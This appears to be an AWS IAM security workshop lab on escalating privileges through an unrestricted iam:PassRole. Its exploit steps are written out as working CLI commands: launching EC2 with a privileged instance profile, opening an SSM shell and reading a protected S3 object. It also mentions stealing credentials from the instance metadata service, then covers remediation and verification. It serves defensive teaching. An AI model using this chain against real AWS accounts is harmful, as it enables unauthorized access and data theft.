## Scenario 3: PassRole + EC2 — New PassRole via Missing `iam:PassedToService` Condition

**Category:** New PassRole
**Starting Identity:** `iamws-ci-runner-user`
**Target:** Crown jewels via EC2 instance launched with `iamws-prod-deploy-profile`

**The Vulnerability:** `iamws-ci-runner-user` has `iam:PassRole` intended for Lambda deployments, but the permission has `Resource: "*"` and no `iam:PassedToService` condition. Without this condition, PassRole works for any AWS service — including EC2 — and any role, including privileged ones.

**Real-world scenario:** A deployer principal has `iam:PassRole` so it can hand Lambda functions their execution roles at deploy time, plus `ec2:RunInstances` for spinning up build and dev infrastructure — a normal-looking combination. The PassRole statement was copy-pasted from a Stack Overflow answer or AWS docs example that didn't include the `iam:PassedToService` condition. Without that condition, PassRole isn't actually scoped to Lambda — it works for any AWS service. The attacker passes a privileged role to EC2 instead, launches an instance with it attached, and reads the role's credentials off the instance metadata service.

> [!NOTE]
> **EC2 + PassRole primer:** An EC2 *instance profile* is the mechanism for attaching an IAM role to a virtual machine. The instance retrieves temporary credentials for that role from the metadata service (`169.254.169.254`), so any workload running on the instance can call AWS APIs as that role. `iam:PassRole` is the gatekeeper that controls which roles a user can hand off to AWS services like EC2 and Lambda.

### Part A: Identify with iam-recon

Build or refresh your iam-recon graph:

```bash
iam-recon graph create --profile iamws-lab-default
```

Run the privilege escalation preset scoped to this scenario's principal — this scenario's EC2 edge IS visible here:

```bash
iam-recon --account $ACCOUNT_ID argquery --preset privesc --principal user/iamws-ci-runner-user
```

Expected output:
```
  user/iamws-ci-runner-user can escalate to admin:
    user/iamws-ci-runner-user -> EC2 role/iamws-prod-deploy-role
```

The `EC2` edge flags that `iamws-ci-runner-user` can pass a privileged role to an EC2 instance.

Confirm the specific permission:

```bash
iam-recon --account $ACCOUNT_ID argquery \
  --principal user/iamws-ci-runner-user \
  --action iam:PassRole
```

Expected output:
```
ALLOW user/iamws-ci-runner-user can call iam:PassRole with *
```

Cross-reference with pathfinding.cloud — scoped to this principal:

```bash
iam-recon --account $ACCOUNT_ID pathfinding --principal user/iamws-ci-runner-user
```

Expected output:
```
Pathfinding.cloud
  Database: N known escalation paths bundled

  user/iamws-ci-runner-user — 1 paths matched:

  [ec2-001] PassRole + RunInstances (new-passrole)
    Permissions: iam:PassRole, ec2:RunInstances
    https://www.pathfinding.cloud/paths/ec2-001
```

**In the interactive visualization:** search for `ci-runner-user`. The node is orange with a path to the `iamws-prod-deploy-role` node in read. Click the `ci-runner-user` user. Click the `iamws-ci-runner-policy` annotated with 1 risk. `iam-recon` highlights that this policy has an unscoped `iam:PassRole` permission.

### Part B: Understand the Attack

Visit [pathfinding.cloud/paths/ec2-001](https://pathfinding.cloud/paths/ec2-001):

- **Category:** New PassRole
- **Required permissions:** `iam:PassRole` + `ec2:RunInstances` (unrestricted)
- **Root cause:** Missing `iam:PassedToService` condition key
- **Impact:** Access to any role that has an instance profile

PassRole attacks are indirect — the attacker doesn't directly become the role. They hand it to a compute service that exposes the credentials. One mitigation is scoping the handoff to the intended service only.

### Part C: Exploit the Vulnerability

**Step 1: Try the crown jewels — you're denied**

First, confirm that `iamws-ci-runner-user` cannot access the crown jewels bucket directly. This establishes the baseline: S3 access is denied, so any access you gain later comes entirely from the PassRole exploit — not from pre-existing S3 permissions.

Set your account ID:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-ci-runner-user)
```

Attempt to access the crown jewels — expect a 403:

```bash
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-ci-runner-user
```

Expected output:
```
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

**Step 2: Find a suitable AMI**

To launch an EC2 instance you need two things: a machine image (AMI) to boot from, and a subnet to place it in. The command below finds the latest Amazon Linux 2 AMI — a lightweight, AWS-maintained image that comes with the SSM agent pre-installed, which you'll use in a later step to connect to the instance without needing SSH or a key pair.

```bash
AMI_ID=$(aws ec2 describe-images \
  --owners amazon \
  --filters "Name=name,Values=amzn2-ami-hvm-*-x86_64-gp2" "Name=state,Values=available" \
  --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' --output text \
  --profile iamws-ci-runner-user)

echo "AMI: $AMI_ID"
```

**Step 3: Find a suitable subnet**

EC2 also needs to know which VPC subnet to place the instance in. This grabs the default subnet so you don't need any prior knowledge of the account's network topology.

```bash
SUBNET_ID=$(aws ec2 describe-subnets \
  --filters "Name=default-for-az,Values=true" \
  --query 'Subnets[0].SubnetId' --output text \
  --profile iamws-ci-runner-user)

echo "Subnet: $SUBNET_ID"
```

**Step 4: Launch EC2 with the privileged instance profile**

This is the exploit. The `--iam-instance-profile Name=iamws-prod-deploy-profile` flag is what exercises `iam:PassRole` — you're handing the privileged `iamws-prod-deploy-role` to EC2 instead of the intended Lambda service. Because `iamws-ci-runner-user` has no `iam:PassedToService` condition on its PassRole permission, AWS accepts this without complaint.

```bash
INSTANCE_ID=$(aws ec2 run-instances \
  --image-id $AMI_ID --instance-type t2.micro \
  --iam-instance-profile Name=iamws-prod-deploy-profile \
  --subnet-id $SUBNET_ID \
  --query 'Instances[0].InstanceId' --output text \
  --profile iamws-ci-runner-user)

echo "Launched: $INSTANCE_ID"
```

No error — unrestricted PassRole let us attach the privileged `iamws-prod-deploy-profile` to a new EC2 instance.

**Step 5: Wait for the SSM agent to register (~90 seconds)**

Instead of SSH, you'll use AWS Systems Manager (SSM) Session Manager to connect to the instance. SSM lets you open a shell without key pairs or open inbound ports — the instance's SSM agent initiates an outbound connection to the SSM service and registers itself. You need to wait for that registration before you can open a session.

> [!NOTE]
> `iamws-ci-runner-user` lacks `ssm:DescribeInstanceInformation`, so you check the agent status using `iamws-lab-default` (your admin identity). You'll connect to the session itself as `iamws-ci-runner-user` in the next step.

Wait 90 seconds for the agent to register:

```bash
sleep 90
```

Check that the agent is online:

```bash
aws ssm describe-instance-information \
  --filters "Key=InstanceIds,Values=$INSTANCE_ID" \
  --query 'InstanceInformationList[0].PingStatus' --output text \
  --profile iamws-lab-default
```

Expected output: `Online`. If blank, wait a bit longer and retry.

**Step 6: Start an SSM session**

This step is interactive — run it from your terminal. Once inside the shell, any AWS API calls automatically use the instance's attached role (`iamws-prod-deploy-role`) via the EC2 metadata service — not your `iamws-ci-runner-user` credentials.

```bash
aws ssm start-session --target $INSTANCE_ID \
  --profile iamws-ci-runner-user
```

**Step 7: Claim the crown jewels from inside the session**

You're now operating as the privileged role. Verify the identity:

```bash
aws sts get-caller-identity
```

Expected output shows `iamws-prod-deploy-role` — the instance assumed the privileged role.

Capture your account ID (the instance credentials have no `--profile` flag — they come from the metadata service):

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
```

Access the crown jewels:

```bash
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt -
```

Exit the session:

```bash
exit
```

The crown jewels are accessible from inside the instance.

> [!NOTE]
> A real attacker wouldn't stop here. They could exfiltrate the instance's temporary credentials via the metadata service at `169.254.169.254`, use them from any machine, or create a persistent IAM user — all without logging into the instance interactively.

### Part D: Apply the Defense

Run all defense steps as your admin identity.

**Step 1: Apply a scoped inline policy**

You're adding this as an inline policy rather than updating the shared managed policy (`iamws-ci-runner-policy`). Inline policies are scoped to a single principal, so this change lands immediately on this user without touching `iamws-ci-runner-role`, which shares the managed policy.

The policy has two statements. The first rewrites PassRole with three simultaneous constraints — Action, Resource, and Condition. The second preserves the EC2 permissions the CI runner needs for build infrastructure. Before you run it, notice the Resource in Statement 1: `iamws-ci-runner-role` is the CI runner's own role — the one it's authorized to hand off, not a privileged role like `iamws-prod-deploy-role`. Scoping to a specific ARN instead of `*` is what ensures the user can't pass arbitrary roles.

Set your account ID (needed to scope the role ARN in the policy document):

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
```

Apply the inline policy:

```bash
aws iam put-user-policy \
  --user-name iamws-ci-runner-user \
  --policy-name SecurePassRole \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Sid": "AllowPassRoleToLambdaOnly",
        "Effect": "Allow",
        "Action": "iam:PassRole",
        "Resource": "arn:aws:iam::'${ACCOUNT_ID}':role/iamws-ci-runner-role",
        "Condition": {"StringEquals": {"iam:PassedToService": "lambda.amazonaws.com"}}
      },
      {
        "Sid": "AllowEC2Operations",
        "Effect": "Allow",
        "Action": ["ec2:RunInstances","ec2:DescribeInstances","ec2:DescribeImages",
                   "ec2:DescribeSecurityGroups","ec2:DescribeSubnets","ec2:DescribeKeyPairs"],
        "Resource": "*"
      }
    ]
  }'
```

**What each statement does:**

`AllowPassRoleToLambdaOnly` has three constraints that must all match simultaneously for the allow to fire:
- **Action: `iam:PassRole`** — this specific action only, not `iam:*`
- **Resource: `iamws-ci-runner-role`** — only the CI runner's own role; if the user tries to pass `iamws-prod-deploy-role` or any other role, this statement doesn't apply
- **Condition: `iam:PassedToService: lambda.amazonaws.com`** — only when the destination is Lambda; an `ec2:RunInstances` call with a `--iam-instance-profile` flag targets EC2, not Lambda, so this condition fails and the statement is a no-op

If any one of the three doesn't match, the statement produces no allow.

`AllowEC2Operations` preserves the EC2 permissions the CI runner uses legitimately. You might wonder: if `ec2:RunInstances` was half of the original attack, why keep it? Because the attack required *both* `ec2:RunInstances` and an unconstrained `iam:PassRole` at the same time. The first statement has now locked down PassRole — `ec2:RunInstances` alone cannot complete the exploit.

**Step 2: Detach the overly-permissive managed policy**

The inline policy from Step 1 restricts PassRole, but IAM evaluates all attached policies together and grants access if any one allows it. The original managed policy still has an unrestricted PassRole — leaving it attached would make the new inline policy pointless. You must remove the old policy to actually close the gap.

```bash
aws iam detach-user-policy \
  --user-name iamws-ci-runner-user \
  --policy-arn arn:aws:iam::${ACCOUNT_ID}:policy/iamws-ci-runner-policy 2>/dev/null || true
```

### Part E: Verify the Remediation

**Step 1: Confirm the attack path is blocked with simulate-principal-policy**

Legitimate path — pass own role to Lambda (should still work):

```bash
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::${ACCOUNT_ID}:user/iamws-ci-runner-user \
  --action-names iam:PassRole \
  --resource-arns arn:aws:iam::${ACCOUNT_ID}:role/iamws-ci-runner-role \
  --context-entries '[{"ContextKeyName":"iam:PassedToService","ContextKeyValues":["lambda.amazonaws.com"],"ContextKeyType":"string"}]' \
  --query 'EvaluationResults[0].EvalDecision'
```

Expected output: `"allowed"` — legitimate Lambda PassRole still works.

Attack path — pass privileged role to EC2 (should fail):

```bash
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::${ACCOUNT_ID}:user/iamws-ci-runner-user \
  --action-names iam:PassRole \
  --resource-arns arn:aws:iam::${ACCOUNT_ID}:role/iamws-prod-deploy-role \
  --context-entries '[{"ContextKeyName":"iam:PassedToService","ContextKeyValues":["ec2.amazonaws.com"],"ContextKeyType":"string"}]' \
  --query 'EvaluationResults[0].EvalDecision'
```

Expected output: `"implicitDeny"` — the EC2 PassRole path is blocked.

**Step 3: Verify with iam-recon**

Refresh the graph:

```bash
iam-recon graph create --profile iamws-lab-default
```

Re-run the privilege escalation preset scoped to this principal:

```bash
iam-recon --account $ACCOUNT_ID argquery --preset privesc --principal user/iamws-ci-runner-user
```

Expected output:
```
  user/iamws-ci-runner-user cannot escalate to admin.
```

The EC2 PassRole edge to `iamws-prod-deploy-role` is gone. iam-recon's EC2 edge checker correctly evaluates `iam:PassedToService`.

Confirm the specific attack permission is denied:

```bash
iam-recon --account $ACCOUNT_ID argquery \
  --principal user/iamws-ci-runner-user \
  --action iam:PassRole \
  --resource 'arn:aws:iam::*:role/iamws-prod-deploy-role'
```

Expected output:
```
DENY user/iamws-ci-runner-user cannot call iam:PassRole with arn:aws:iam::*:role/iamws-prod-deploy-role
```

**In the interactive visualization:** search for `ci-runner-user`. The node is now blue (User). The EC2 edge to `iamws-prod-deploy-role` is gone. The `IDENTITY` panel lists `SecurePassRole` as the only policy.

### Going Further

The defense above scopes the **user's** permissions. `iamws-ci-runner-role` is a sibling principal — a separate identity that shares the same vulnerable `iamws-ci-runner-policy` but has no trust relationship with `iamws-ci-runner-user`. It wasn't part of the attack path you just ran, but it carries the same misconfiguration.

Verify the edge still exists after fixing the user — scope to the role this time:

```bash
iam-recon --account $ACCOUNT_ID argquery --preset privesc --principal role/iamws-ci-runner-role
```

Expected output:
```
  role/iamws-ci-runner-role can escalate to admin:
    role/iamws-ci-runner-role -> EC2 role/iamws-prod-deploy-role
```

**Knowledge check:** How would you adapt the Part D commands to fix the role? What's the minimum that needs to change compared to what you ran in Part D?

### What You Learned

- `iam:PassRole` is the permission that lets a user hand an IAM role to an AWS service — for example, giving a Lambda function its execution role. Without constraints, that same permission lets an attacker hand *any* role to *any* service, including a privileged role to EC2.
- The `iam:PassedToService` condition key tells AWS which service is allowed to receive the role. Without it, PassRole is a blank check — the user's intended action (Lambda deployment) and the attacker's exploit (EC2 launch) look identical to IAM.
- Scoping both the Resource (a specific role ARN) and the Condition (a specific service) creates two independent constraints. An attacker would need to pass the exact allowed role *and* pass it to the exact allowed service — defeating either one blocks the path.
- `aws iam simulate-principal-policy` evaluates how IAM would respond to a given API call without making a real request. The `--context-entries` flag is how you supply condition key values — like `iam:PassedToService` — that exist in a real API call but aren't present in a dry-run simulation.
- Fixing a user's permissions doesn't fix a role's permissions, even when both have the same managed policy attached. IAM evaluates policies per-principal — if multiple principals share a vulnerable policy, you need to audit and remediate each one.